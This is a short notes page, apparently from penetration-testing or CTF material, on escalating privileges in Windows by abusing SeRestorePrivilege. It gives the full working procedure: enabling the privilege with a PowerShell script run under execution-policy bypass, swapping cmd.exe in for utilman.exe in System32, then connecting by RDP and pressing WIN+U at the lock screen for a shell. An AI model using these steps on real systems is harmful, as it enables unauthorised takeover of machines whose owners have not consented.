# SeRestorePrivilege

## Other privileges to abuse


There's a good list of possible privileges to abuse [here](https://github.com/gtworek/Priv2Admin).

## The abuse

This just follows the example from the above link, but this is written out a little more:

if you see:

```
...
SeRestorePrivilege            Restore files and directories  Enabled
...
```

in your privileges, run this script:

https://raw.githubusercontent.com/gtworek/PSBits/master/Misc/EnableSeRestorePrivilege.ps1

```
powershell -ep bypass ./EnableSeRestorePrivilege.ps1
```

now, you have the privilege actually enabled in your shell.

This makes it possible for you to `move` executables in C:/Windows/System32.

So you can abuse it by doing:

```
move utilman.exe utilman.exe.old
move cmd.exe utilman.exe
```

(note that we only have access to `move`, not `copy` in the directory).

From a locked screen, you can now get a shell by pressing WIN+U.

Obviously, this requires RDP being enabled, but you don't actually need a user with RDP access.
You can simply do:

```
rdesktop $TARGET_IP
```

And you have a locked screen you can work with.

